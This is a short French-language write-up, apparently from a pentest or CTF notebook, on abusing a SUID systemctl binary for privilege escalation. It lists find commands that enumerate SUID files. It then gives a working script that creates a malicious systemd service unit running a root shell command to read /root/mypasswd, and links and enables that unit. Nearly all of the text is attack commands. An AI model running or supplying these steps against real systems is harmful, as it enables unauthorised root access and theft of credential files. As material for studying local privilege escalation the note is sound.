Vulnérabilité SUID avec systemctl
===

Recherche de tous les fichiers en SUID sur le serveur via :

```bash
$ find / -user root -perm -4000 -print 2>/dev/null
/bin/umount
/bin/mount
/bin/systemctl
/bin/passwd
/bin/sudo
/bin/newgrp
/bin/mount
[...]
```

Ou :

```bash
$ find / -perm -u=s -type f 2>/dev/null
$ find / -user root -perm -4000 -exec ls -ldb {} \;
```

On remarque que **/bin/systemctl** est de type **SUID**.
Après quelques recherches, on remarque qu'on peut exploiter cette faille avec :

```bash
$ sudo sh -c 'cp $(which systemctl) .; chmod +s ./systemctl'

$ TF=$(mktemp).service
  echo '[Service]
  Type=oneshot
  ExecStart=/bin/sh -c "cat /root/mypasswd"
  [Install]
  WantedBy=multi-user.target' > $TF

$ ./systemctl link $TF

$ ./systemctl enable --now $TF
```

Ce script permet ici, d'afficher le contenu présent dans **/root/mypasswd**.